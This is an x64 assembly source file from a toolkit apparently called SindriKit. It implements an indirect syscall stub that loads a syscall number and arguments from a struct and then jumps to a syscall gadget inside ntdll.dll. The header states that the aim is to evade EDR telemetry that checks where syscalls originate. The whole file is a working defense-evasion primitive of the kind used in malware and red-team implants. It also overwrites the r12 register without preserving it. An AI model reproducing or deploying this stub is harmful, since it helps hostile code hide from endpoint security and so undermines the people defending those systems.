; ===========================================================================
; invoke_indirect_x64.asm  -  SindriKit Indirect Syscall Invocation ASM Stub
; ===========================================================================
;
; Exports:
;   snd_syscall_indirect_invoke_asm
;
; Invokes a syscall indirectly by jumping to a legitimate `syscall` gadget
; within ntdll.dll to evade EDR telemetry checking the RIP of the syscall.
; ===========================================================================

.code

PUBLIC snd_syscall_indirect_invoke_asm

; snd_syscall_indirect_invoke_asm(SND_SYSCALL_ARGS* args)
snd_syscall_indirect_invoke_asm PROC
    push rbp
    mov rbp, rsp
    sub rsp, 88

    ; RCX points to SND_SYSCALL_ARGS struct

    ; Extract the gadget address (sys_addr) which is at the very end of the struct
    ; Offset is 96 (WORD ssn (2) + padding (6) + 11*PVOID (88))
    mov r11, [rcx+96]

    test r11, r11
    jnz GadgetValid
    mov eax, 0C000000Dh
    jmp Cleanup

GadgetValid:
    ; Setup stack arguments (args 5-11) safely in a new frame
    mov rax, [rcx+40]   ; arg5
    mov [rsp+32], rax
    mov rax, [rcx+48]   ; arg6
    mov [rsp+40], rax
    mov rax, [rcx+56]   ; arg7
    mov [rsp+48], rax
    mov rax, [rcx+64]   ; arg8
    mov [rsp+56], rax
    mov rax, [rcx+72]   ; arg9
    mov [rsp+64], rax
    mov rax, [rcx+80]   ; arg10
    mov [rsp+72], rax
    mov rax, [rcx+88]   ; arg11
    mov [rsp+80], rax

    ; Extract SSN and arguments 1-4
    movzx eax, word ptr [rcx] ; ssn is a WORD
    mov r10, [rcx+8]    ; arg1 (must go to r10 for syscall)
    mov rdx, [rcx+16]   ; arg2
    mov r8,  [rcx+24]   ; arg3
    mov r9,  [rcx+32]   ; arg4

    lea r12, Cleanup
    push r12

    ; Jump to the NTDLL syscall gadget
    jmp r11

Cleanup:
    mov rsp, rbp
    pop rbp
    ret
snd_syscall_indirect_invoke_asm ENDP

end
